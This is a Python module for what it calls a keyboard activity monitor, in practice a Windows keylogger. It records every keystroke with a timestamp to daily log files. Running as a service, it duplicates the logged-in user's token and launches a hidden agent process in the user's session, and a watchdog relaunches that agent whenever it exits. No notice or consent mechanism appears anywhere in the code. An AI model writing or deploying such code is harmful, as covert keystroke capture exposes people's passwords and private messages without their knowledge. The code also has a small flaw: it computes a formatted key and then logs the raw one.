"""
Keyboard activity monitor.

Strategy
--------
* In interactive sessions (debug mode), the monitor uses pynput directly.
* In Windows Service (Session 0), a user-session agent is spawned via
  CreateProcessAsUser so that keyboard input can be observed from the
  interactive desktop session.

Keyboard diagnostic/activity logs are stored separately from application logs:

    C:\\WorkstationMonitor\\logs\\
        monitor_service.log
        keyboard_agent.log

    C:\\WorkstationMonitor\\keyboard\\
        YYYY\\
            MM\\
                DD\\
                    keyboard.log
"""

import os
import logging
import threading
from datetime import datetime

from pynput import keyboard

import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import config
from monitoring.utils import dated_subdir, format_logged_key


logger = logging.getLogger(__name__)

_AGENT_SCRIPT = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "keylogger_agent.py",
)


# ------------------------------------------------------------------
# Python executable
# ------------------------------------------------------------------

def _resolve_python_executable() -> str:
    """
    Resolve a Python executable suitable for launching the user-session
    agent.

    When running as a pywin32 Windows service, sys.executable may be
    pythonservice.exe. In that case use the python.exe next to it.
    """
    executable = sys.executable

    if os.path.basename(executable).lower() == "pythonservice.exe":
        candidate = os.path.join(
            os.path.dirname(executable),
            "python.exe",
        )

        if os.path.exists(candidate):
            return candidate

    return executable


# ------------------------------------------------------------------
# Session detection
# ------------------------------------------------------------------

def _is_session_0() -> bool:
    """
    Return True when the current process is running in Windows Session 0.
    """
    try:
        import ctypes

        ProcessIdToSessionId = (
            ctypes.windll.kernel32.ProcessIdToSessionId
        )

        session = ctypes.c_ulong(0)

        result = ProcessIdToSessionId(
            os.getpid(),
            ctypes.byref(session),
        )

        if not result:
            return False

        return session.value == 0

    except Exception:
        return False


# ------------------------------------------------------------------
# User-session agent
# ------------------------------------------------------------------

def _spawn_agent_in_user_session(keyboard_dir: str):
    """
    Launch the keyboard activity agent inside the active interactive
    Windows user session.

    The first argument passed to the agent is ALWAYS the keyboard
    directory, not a static keyboard.log path.

    The agent is therefore responsible for creating:

        keyboard/YYYY/MM/DD/keyboard.log
    """

    try:
        import win32ts
        import win32security
        import win32process
        import win32con
        import win32api

        # ----------------------------------------------------------
        # Find active console session
        # ----------------------------------------------------------

        session_id = win32ts.WTSGetActiveConsoleSessionId()

        if session_id == 0xFFFFFFFF:
            logger.warning(
                "Keyboard agent: no active user session found"
            )
            return None

        # ----------------------------------------------------------
        # Get user token
        # ----------------------------------------------------------

        user_token = win32ts.WTSQueryUserToken(session_id)

        try:
            primary_token = win32security.DuplicateTokenEx(
                user_token,
                win32security.SecurityImpersonation,
                win32con.TOKEN_ALL_ACCESS,
                win32security.TokenPrimary,
            )

        finally:
            win32api.CloseHandle(user_token)

        # ----------------------------------------------------------
        # Diagnostic log remains FLAT under logs\
        # ----------------------------------------------------------

        os.makedirs(
            config.LOGS_DIR,
            exist_ok=True,
        )

        diag_log_file = os.path.join(
            config.LOGS_DIR,
            "keyboard_agent.log",
        )

        # ----------------------------------------------------------
        # Ensure keyboard root exists
        # ----------------------------------------------------------

        os.makedirs(
            keyboard_dir,
            exist_ok=True,
        )

        # ----------------------------------------------------------
        # Escape command-line paths
        # ----------------------------------------------------------

        python_exe = _resolve_python_executable().replace(
            '"',
            '\\"',
        )

        agent_script = _AGENT_SCRIPT.replace(
            '"',
            '\\"',
        )

        keyboard_dir_esc = os.path.abspath(
            keyboard_dir
        ).replace(
            '"',
            '\\"',
        )

        diag_log_file_esc = os.path.abspath(
            diag_log_file
        ).replace(
            '"',
            '\\"',
        )

        # IMPORTANT:
        # Pass keyboard DIRECTORY, not keyboard.log.
        cmd = (
            f'"{python_exe}" '
            f'"{agent_script}" '
            f'"{keyboard_dir_esc}" '
            f'"{diag_log_file_esc}"'
        )

        # ----------------------------------------------------------
        # Startup configuration
        # ----------------------------------------------------------

        startup = win32process.STARTUPINFO()

        startup.dwFlags = (
            win32con.STARTF_USESHOWWINDOW
        )

        startup.wShowWindow = win32con.SW_HIDE

        startup.lpDesktop = "winsta0\\default"

        # ----------------------------------------------------------
        # Create process inside active user session
        # ----------------------------------------------------------

        try:
            proc_info = win32process.CreateProcessAsUser(
                primary_token,
                None,
                cmd,
                None,
                None,
                False,
                win32con.CREATE_NO_WINDOW,
                None,
                None,
                startup,
            )

        finally:
            win32api.CloseHandle(primary_token)

        proc_handle, thread_handle, pid, _tid = proc_info

        # We only need the process handle.
        win32api.CloseHandle(thread_handle)

        logger.info(
            "Keyboard agent spawned in user session %d (PID %d)",
            session_id,
            pid,
        )

        logger.info(
            "Keyboard agent directory: %s",
            os.path.abspath(keyboard_dir),
        )

        return proc_handle

    except Exception as exc:
        logger.warning(
            "Could not spawn keyboard agent in user session: %s",
            exc,
        )

        return None


# ==================================================================
# KeyboardMonitor
# ==================================================================

class KeyboardMonitor:
    """
    Keyboard activity monitor.

    Daily files are organized as:

        KEYBOARD_DIR/
            YYYY/
                MM/
                    DD/
                        keyboard.log
    """

    def __init__(self):
        self._listener: keyboard.Listener | None = None

        # Windows Service / Session 0 agent
        self._agent_handle = None
        self._agent_lock = threading.Lock()

        self._agent_watchdog_thread: threading.Thread | None = None

        # Interactive-session buffer
        self._buffer: list[str] = []
        self._lock = threading.Lock()

        self._flush_thread: threading.Thread | None = None

        self._stop_event = threading.Event()

        self._using_agent = False

    # ------------------------------------------------------------------
    # Start
    # ------------------------------------------------------------------

    def start(self):
        """
        Start keyboard monitoring.
        """

        os.makedirs(
            config.LOGS_DIR,
            exist_ok=True,
        )

        os.makedirs(
            config.KEYBOARD_DIR,
            exist_ok=True,
        )

        self._stop_event.clear()

        # --------------------------------------------------------------
        # Windows Service -> Session 0
        # --------------------------------------------------------------

        if _is_session_0():

            logger.info(
                "KeyboardMonitor: detected Session 0, "
                "spawning user-session agent"
            )

            handle = _spawn_agent_in_user_session(
                config.KEYBOARD_DIR
            )

            if handle is not None:

                with self._agent_lock:
                    self._agent_handle = handle

                self._using_agent = True

                self._agent_watchdog_thread = threading.Thread(
                    target=self._agent_watchdog_loop,
                    daemon=True,
                    name="keyboard-agent-watchdog",
                )

                self._agent_watchdog_thread.start()

                logger.info(
                    "KeyboardMonitor started (user-session agent)"
                )

            else:

                logger.warning(
                    "KeyboardMonitor: could not spawn "
                    "user-session agent; keyboard activity "
                    "logging will be unavailable."
                )

            return

        # --------------------------------------------------------------
        # Interactive / debug session
        # --------------------------------------------------------------

        try:

            self._listener = keyboard.Listener(
                on_press=self._on_press
            )

            self._listener.start()

            self._flush_thread = threading.Thread(
                target=self._flush_loop,
                daemon=True,
                name="keyboard-flush",
            )

            self._flush_thread.start()

            logger.info(
                "KeyboardMonitor started"
            )

        except Exception as exc:

            logger.warning(
                "Failed to start keyboard monitor: %s. "
                "Keyboard activity logging will be unavailable.",
                exc,
            )

    # ------------------------------------------------------------------
    # Stop
    # ------------------------------------------------------------------

    def stop(self):

        self._stop_event.set()

        # --------------------------------------------------------------
        # Stop user-session agent
        # --------------------------------------------------------------

        if self._using_agent:

            with self._agent_lock:
                handle = self._agent_handle
                self._agent_handle = None

            if handle is not None:

                try:

                    import win32process
                    import win32api

                    try:
                        win32process.TerminateProcess(
                            handle,
                            0,
                        )

                    except Exception as exc:

                        logger.debug(
                            "Error terminating keyboard agent: %s",
                            exc,
                        )

                    finally:

                        win32api.CloseHandle(
                            handle
                        )

                except Exception as exc:

                    logger.debug(
                        "Error cleaning up keyboard agent handle: %s",
                        exc,
                    )

            if self._agent_watchdog_thread:

                self._agent_watchdog_thread.join(
                    timeout=5
                )

        # --------------------------------------------------------------
        # Stop interactive listener
        # --------------------------------------------------------------

        if self._listener:

            try:
                self._listener.stop()

            except Exception as exc:

                logger.debug(
                    "Error stopping keyboard listener: %s",
                    exc,
                )

        # --------------------------------------------------------------
        # Stop flush thread
        # --------------------------------------------------------------

        if self._flush_thread:

            self._flush_thread.join(
                timeout=10
            )

        self._flush()

        logger.info(
            "KeyboardMonitor stopped"
        )

    # ------------------------------------------------------------------
    # Agent watchdog
    # ------------------------------------------------------------------

    def _agent_watchdog_loop(self):
        """
        Monitor the user-session agent.

        If it exits unexpectedly, attempt to start it again.
        """

        try:

            import win32event
            import win32process
            import win32api

        except ImportError:

            logger.warning(
                "pywin32 modules unavailable; "
                "keyboard agent watchdog disabled."
            )

            return

        while not self._stop_event.wait(10):

            with self._agent_lock:
                handle = self._agent_handle

            if handle is None:
                continue

            status = win32event.WaitForSingleObject(
                handle,
                0,
            )

            if status != win32event.WAIT_OBJECT_0:
                continue

            # ----------------------------------------------------------
            # Process exited
            # ----------------------------------------------------------

            try:

                exit_code = (
                    win32process.GetExitCodeProcess(
                        handle
                    )
                )

            except Exception:

                exit_code = -1

            try:

                win32api.CloseHandle(
                    handle
                )

            except Exception:

                pass

            with self._agent_lock:

                if self._agent_handle is handle:
                    self._agent_handle = None

            if self._stop_event.is_set():
                break

            logger.warning(
                "Keyboard agent exited unexpectedly "
                "(code %s); attempting restart",
                exit_code,
            )

            new_handle = _spawn_agent_in_user_session(
                config.KEYBOARD_DIR
            )

            if new_handle is not None:

                with self._agent_lock:
                    self._agent_handle = new_handle

                logger.info(
                    "Keyboard agent restarted successfully"
                )

            else:

                logger.warning(
                    "Keyboard agent restart failed; "
                    "will retry"
                )

    # ------------------------------------------------------------------
    # Interactive activity callback
    # ------------------------------------------------------------------

    def _on_press(self, key):
        """
        Handle keyboard input in interactive/debug mode.

        Keep the event handling lightweight; actual writing is performed
        by the flush thread.
        """
        logged_key = format_logged_key(key)
        entry = (
            f"{datetime.now().isoformat()} "
            f"{key}\n"
        )

        with self._lock:
            self._buffer.append(entry)

    # ------------------------------------------------------------------
    # Flush loop
    # ------------------------------------------------------------------

    def _flush_loop(self):

        while not self._stop_event.wait(
            config.KEYBOARD_FLUSH_INTERVAL
        ):
            self._flush()

    # ------------------------------------------------------------------
    # Daily log
    # ------------------------------------------------------------------

    def _flush(self):

        with self._lock:

            if not self._buffer:
                return

            entries, self._buffer = (
                self._buffer,
                [],
            )

        # --------------------------------------------------------------
        # IMPORTANT:
        #
        # This creates:
        #
        # keyboard/
        #     YYYY/
        #         MM/
        #             DD/
        #                 keyboard.log
        # --------------------------------------------------------------

        try:

            day_dir = dated_subdir(
                config.KEYBOARD_DIR
            )

            log_file = os.path.join(
                day_dir,
                "keyboard.log",
            )

            os.makedirs(
                day_dir,
                exist_ok=True,
            )

            with open(
                log_file,
                "a",
                encoding="utf-8",
            ) as fh:

                fh.writelines(entries)

        except OSError:

            logger.exception(
                "Failed to flush keyboard activity log"
            )